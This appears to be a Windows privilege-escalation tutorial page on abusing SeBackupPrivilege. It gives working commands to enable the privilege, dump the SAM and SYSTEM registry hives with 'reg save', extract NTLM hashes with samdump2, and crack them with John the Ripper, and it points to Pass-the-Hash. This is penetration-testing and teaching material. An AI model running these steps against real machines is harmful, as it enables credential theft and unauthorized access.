# Backup Privilege

This policy specifies which users are allowed to bypass file, directory, registry, and other persistent object permissions for the purpose of creating system backups. This permission is only effective through the NTFS backup application programming interface (API). [Link](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)

This is a high-risk permission, as it could enable an attacker to access sensitive files on the system, such as the **SAM** and **SYSTEM** files, which store user hashes. These hashes can then be used for local cracking attacks or “Pass the Hash” attacks.

### Attack

Exploitation begins by enabling this permission. This can be achieved using the [`EnableSeBackupPrivilege.ps1`](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1) script. Afterward, sensitive files such as **SAM** and **SYSTEM** can be copied as shown below.

```batch
reg save hklm\sam .\SAM
reg save hklm\system .\SYSTEM
```

The hashes can then be extracted and transferred to a local machine for use in "Pass The Hash" attacks or cracked with tools like John the Ripper or Hashcat. [Link](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

```bash
samdump2 SYSTEM SAM -o sam.txt
```

To crack:

```bash
john --format=NT --wordlist=rockyou.txt sam.txt
```

### Tools

[EnableSeBackupPrivilege.ps1](https://daniel10barredo.github.io/PrivEscAssist_Windows/tools/EnableSeBackupPrivilege.ps1)

## Example

First, confirm the presence of the **SeBackupPrivilege** privilege.

![Privilege Check](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/seRestore_1.png)

As shown in the image above, the permission is disabled. To enable it, execute the `EnableSeBackupPrivilege.ps1` PowerShell script.

![Enabling Backup Privilege](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/seBackup_1.png)

With the permission enabled, copy the **SAM** and **SYSTEM** registry hives to the attacker machine.

![Copying SAM and SYSTEM](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/seBackup_2.png)

On a Kali machine, extract NTLM hashes using the `samdump2` command.

![Extracting Hashes](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/seBackup_3.png)

Store the hashes in a file (`sam.txt`) and crack them using John The Ripper, as shown below.

![Cracking Hashes](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/seBackup_4.png)

Alternatively, attempt a Pass The Hash attack to gain direct access to the machine without needing credentials.

![Pass The Hash Attack](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/seBackup_5.png)